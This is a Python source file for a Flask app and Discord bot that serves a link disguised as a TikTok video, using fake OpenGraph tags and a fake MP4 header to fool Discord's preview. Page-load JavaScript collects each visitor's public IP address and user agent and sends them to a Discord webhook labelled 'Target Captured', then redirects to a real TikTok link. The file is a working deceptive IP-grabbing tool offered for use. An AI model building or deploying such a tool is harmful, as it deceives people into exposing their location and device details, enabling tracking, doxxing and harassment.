# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string, redirect

# Force IPv4 to prevent Railway boot hangs
_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"
# ---------------------

@app.route('/')
def index():
    # When they hit the root, serve the OpenGraph tags to make it look like a TikTok video
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>TikTok</title>
        <meta property="og:type" content="video.other">
        <meta property="og:site_name" content="TikTok">
        <meta property="og:title" content="Wait for it... 😂">
        <meta property="og:description" content="1.2M views • 2 hours ago">
        <meta property="og:video" content="https://rnbw-production.up.railway.app/video.mp4">
        <meta property="og:video:secure_url" content="https://rnbw-production.up.railway.app/video.mp4">
        <meta property="og:video:type" content="video/mp4">
        <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
    </head>
    <body>
        <script>
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => {
                    fetch('/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
                    }).then(() => {
                        window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
                    });
                });
        </script>
    </body>
    </html>
    """

@app.route('/video.mp4')
def fake_video():
    # Fake MP4 header to trick Discord into showing the native video player
    return app.response_class(
        response=b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom',
        status=200,
        mimetype='video/mp4'
    )

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = data.get('ip', 'Unknown')
    ua = data.get('ua', 'Unknown')
    
    device = "Unknown"
    if "Windows" in ua: device = "Windows PC"
    elif "iPhone" in ua: device = "iPhone"
    elif "Android" in ua: device = "Android"
    elif "Macintosh" in ua: device = "Mac"

    payload = {
        "embeds": [{
            "title": "Target Captured",
            "color": 65280,
            "fields": [
                {"name": "Device Name", "value": f"```{device}```", "inline": False},
                {"name": "Public IP", "value": f"```{ip}```", "inline": False},
                {"name": "Method", "value": "```Video Click```", "inline": False}
            ]
        }]
    }
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=payload)
    return "ok", 200

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    # Sending the raw link forces Discord to scrape the OG tags and build the video player.
    # The < > brackets stop Discord from turning it into a standard text link, leaving ONLY the player.
    await ctx.send(f"<{RAILWAY_URL}>")

def run_bot():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN missing.", flush=True)
        return
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
